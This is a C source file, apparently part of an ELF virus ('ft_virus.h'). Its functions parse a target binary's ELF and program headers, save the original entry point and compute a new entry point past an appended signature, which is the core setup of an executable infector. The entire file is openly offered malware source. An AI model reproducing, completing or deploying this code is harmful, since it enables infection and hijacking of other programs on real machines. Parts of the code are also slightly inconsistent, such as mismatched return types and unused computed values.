#include "ft_virus.h"

int FORCE_INLINE find_ie(int fd)
{
	Elf64_Shdr	s_hdr;
	Elf64_Ehdr	e_hdr;
	int		len;
	u64		max;

	max = 0;
	LSEEK(fd, 0, SEEK_SET);
	READ(fd, &e_hdr, sizeof(e_hdr));
	len = e_hdr.e_shnum;
	LSEEK(fd, e_hdr.e_shoff, SEEK_SET);
	do {
		READ(fd, &s_hdr, sizeof(s_hdr));
		if (max < s_hdr.sh_addr + s_hdr.sh_size)
			max = s_hdr.sh_addr + s_hdr.sh_size;
		len -= 1;
	} while(len) ;
	return (max);
}


u64 FORCE_INLINE get_virt_addr(int fd)
{
	size_t headers_length;
	Elf64_Ehdr e_hdr;
	Elf64_Phdr p_hdr;

	LSEEK(fd, 0, SEEK_SET);
	READ(fd, &e_hdr, sizeof(e_hdr));
	headers_length = e_hdr.e_phnum;
	LSEEK(fd, e_hdr.e_phoff, SEEK_SET);
	do {
		READ(fd, &p_hdr, sizeof(p_hdr));
		if (p_hdr.p_type == PT_LOAD)
			return p_hdr.p_vaddr;
		headers_length -= 1;
	} while ( headers_length );
	return (0);
}

t_binary get_infos(int fd)
{
	t_binary res;
	Elf64_Ehdr e_hdr;
	char signature[] = SIGNATURE;
	int		max_addr;

	LSEEK(fd, 0, SEEK_SET);
	READ(fd, &e_hdr, sizeof(e_hdr));
	res.old_entry = e_hdr.e_entry;
	res.file_size = LSEEK(fd, 0, SEEK_END);
	res.v_addr = get_virt_addr(fd);
	max_addr = res.file_size + res.v_addr;
	// get the max addr
	max_addr = find_ie(fd);
	res.new_pentry = res.file_size + sizeof(signature) - 1;
	// res.new_entry = max_addr + sizeof(signature) - 1;
	res.new_entry = res.new_pentry + 0xc000000;
	// res.new_entry = max_addr;
	return (res);
}
